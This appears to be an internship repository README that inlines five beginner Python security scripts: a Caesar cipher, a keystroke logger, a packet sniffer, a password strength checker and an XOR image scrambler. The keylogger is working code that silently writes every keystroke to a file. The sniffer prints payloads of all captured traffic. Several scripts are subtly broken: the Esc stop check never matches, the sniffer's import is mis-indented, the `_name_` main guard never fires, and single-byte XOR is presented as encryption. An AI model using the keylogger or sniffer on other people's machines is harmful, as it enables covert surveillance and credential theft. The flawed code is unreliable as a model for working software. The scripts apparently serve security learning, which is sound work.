# HITENDRA_PARGI_PRODIGYINFOTECH_REPO
This repository contains submissions for various cyber security tasks undertaken as part of my internship program. It includes projects, reports, and code related to:

* Caeser CIpher
* Keylogger
* Packet sniffer
* Password strength checker
* Pixel manipulation



1.Caeser Cipher:

def encrypt(text, shift):
    encrypted_text = ""
    for char in text:
        # Check if character is an uppercase letter
        if char.isupper():
            encrypted_text += chr((ord(char) + shift - 65) % 26 + 65)
        # Check if character is a lowercase letter
        elif char.islower():
            encrypted_text += chr((ord(char) + shift - 97) % 26 + 97)
        # If it's neither, keep the character as it is (spaces, punctuation, etc.)
        else:
            encrypted_text += char
    return encrypted_text

def decrypt(text, shift):
    decrypted_text = ""
    for char in text:
        # Check if character is an uppercase letter
        if char.isupper():
            decrypted_text += chr((ord(char) - shift - 65) % 26 + 65)
        # Check if character is a lowercase letter
        elif char.islower():
            decrypted_text += chr((ord(char) - shift - 97) % 26 + 97)
        # If it's neither, keep the character as it is (spaces, punctuation, etc.)
        else:
            decrypted_text += char
    return decrypted_text

# User input
text = input("Enter the text: ")
shift = int(input("Enter the shift value: "))

# Encrypt and display the result
encrypted_text = encrypt(text, shift)
print("Encrypted text:", encrypted_text)

# Decrypt and display the result
decrypted_text = decrypt(encrypted_text, shift)
print("Decrypted text:", decrypted_text)


2.keylogger:

from pynput.keyboard import Listener

def on_press(key):
    try:
        # Log the key and avoid issues with special characters
        with open("key_log.txt", "a") as log_file:
            log_file.write(str(key).replace("'", "") + " ")
    except Exception as e:
        print(f"Error logging key: {e}")

def on_release(key):
    # Stop logging if the Escape key is pressed
    if key == "Key.esc":
        return False

# Start the listener to capture keystrokes
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

3.Packet Sniffer:

    from scapy.all import sniff, IP, TCP, UDP

def packet_callback(packet):

    if IP in packet:
        ip_src = packet[IP].src
        ip_dst = packet[IP].dst
        protocol = packet[IP].proto

        if TCP in packet:
            payload = packet[TCP].payload
        elif UDP in packet:
            payload = packet[UDP].payload
        else:
            payload = None

        print(f"Source IP: {ip_src}")
        print(f"Destination IP: {ip_dst}")
        print(f"Protocol: {protocol}")
        print(f"Payload: {payload}")
        print("-" * 50)
        
# Sniff packets
sniff(prn=packet_callback, store=0)

4.Password Strength Checker;

import re

def check_password_strength(password):
    # Initialize the score and feedback list
    score = 0
    feedback = []
    
    # Check length
    if len(password) >= 8:
        score += 1
    else:
        feedback.append("Password should be at least 8 characters long.")

    # Check for uppercase letters
    if re.search(r'[A-Z]', password):
        score += 1
    else:
        feedback.append("Password should contain at least one uppercase letter.")
    
    # Check for lowercase letters
    if re.search(r'[a-z]', password):
        score += 1
    else:
        feedback.append("Password should contain at least one lowercase letter.")

    # Check for numbers
    if re.search(r'[0-9]', password):
        score += 1
    else:
        feedback.append("Password should contain at least one number.")

    # Check for special characters
    if re.search(r'[@$!%*?&]', password):
        score += 1
    else:
        feedback.append("Password should contain at least one special character (e.g., @$!%*?&).")

    # Provide overall feedback
    if score == 5:
        feedback.append("Your password is strong.")
    elif 3 <= score < 5:
        feedback.append("Your password is moderate. Try adding more variety to make it stronger.")
    else:
        feedback.append("Your password is weak. Consider adding uppercase letters, numbers, and special characters.")
    
    # Display feedback
    print("\nPassword Strength Feedback:")
    for comment in feedback:
        print("-", comment)

# User input
password = input("Enter your password to assess its strength: ")
check_password_strength(password)

5.Pixel Manipulation:

from PIL import Image
import numpy as np

# Function to encrypt/decrypt the image
def image_encrypt_decrypt(image_path, key, output_path):

    # Open image
    img = Image.open(image_path)
    img_array = np.array(img)

    # Flatten the 3D image array into 1D for pixel-wise manipulation
    flat_img_array = img_array.flatten()

    # Perform XOR operation with the key
    encrypted_flat_img = np.bitwise_xor(flat_img_array, key)

    # Reshape back to the original image shape
    encrypted_img_array = encrypted_flat_img.reshape(img_array.shape)

    # Convert numpy array back to an image
    encrypted_img = Image.fromarray(encrypted_img_array.astype('uint8'))

    # Save the output image
    encrypted_img.save(output_path)
    print(f"Image saved at: {output_path}")

# Main function to encrypt/decrypt based on user choice
def main():

    # Ask user for the input image path, key, and operation
    image_path = input("Enter the path of the image: ")
    output_path = input("Enter the output path for the encrypted/decrypted image: ")
    key = int(input("Enter a numeric key (0-255): "))
    
    # Check if the key is in the valid range
    if not (0 <= key <= 255):
        print("Invalid key! Please enter a value between 0 and 255.")
        return
    
    # Ask the user if they want to encrypt or decrypt
    choice = input("Do you want to encrypt or decrypt the image? (e/d): ").lower()
    if choice == 'e':
        print("Encrypting the image...")
    elif choice == 'd':
        print("Decrypting the image...")
    else:
        print("Invalid choice. Exiting.")
        return
    
    # Perform the encryption or decryption
    image_encrypt_decrypt(image_path, key, output_path)
if _name_ == "_main_":
    main()
  
